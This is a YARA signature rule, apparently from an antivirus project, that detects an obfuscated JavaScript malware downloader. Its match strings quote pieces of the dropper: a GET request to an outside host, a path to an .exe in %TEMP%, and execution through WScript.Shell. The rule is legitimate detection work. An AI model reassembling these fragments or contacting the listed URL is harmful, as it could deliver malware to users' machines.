rule sig_20160328_cc72cf4bf460eeec30bcae41538bbc42 {
  meta:
    description = "datamaliciousorder - file 20160328_cc72cf4bf460eeec30bcae41538bbc42.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aafb9ff15e29b31e580daba22bd544d6dd2ab5773d96a460504aae234fc84a24"

  strings:
    $s1  = "function Kskkobhrl() {return Yhmvhjpoc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ItPbnP0NozmbI.exe\";};" fullword ascii
    $s2  = "do {WScript[Jtyct](Vxrtwkyd() * 11)} while (Tjeawtpwll[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Tjeawtpwll[Bewsmkbjul](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Adckg(Prlqicxhnx, Qrxjipbio){return Prlqicxhnx - Qrxjipbio;};" fullword ascii
    $s5  = "var Yhmvhjpoc = function Ublgi() {return WScript[Tfrmc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Pkremzlwn(Skwquqhsc){Yhmvhjpoc[\"Run\"](Skwquqhsc, Bojcujj, Bojcujj);};" fullword ascii
    $s7  = "var Gcxxjlk = false;" fullword ascii
    $s8  = "var Uibndlai = new this[\"Date\"]();" fullword ascii
    $s9  = "function Vxskf(Jepmjtop) {var Ogwqtzgyn = (1, 2, 3, 4, 5, Jepmjtop); return Ogwqtzgyn;};" fullword ascii
    $s10 = " while (Koumtfba){" fullword ascii
    $s11 = "return Adckg(Ftzab, Zkbsb);" fullword ascii
    $s12 = "function Jlolyc(){return Tfrmc;};" fullword ascii
    $s13 = "Zfywfgsco = true; " fullword ascii
    $s14 = "function Nhptywymp(){return Rctxyozrxl;};" fullword ascii
    $s15 = "var Zfywfgsco = false;" fullword ascii
    $s16 = "function Vxrtwkyd(){return 22;};" fullword ascii
    $s17 = "function Wppnony() {return ((Zfywfgsco == true) && (Zfywfgsco == Agocakythm)) ? 1 : Bojcujj;};" fullword ascii
    $s18 = "function Mwhcavqj()" fullword ascii
    $s19 = "} catch(Nxgnaoig){Koumtfba = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "Agocakythm = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}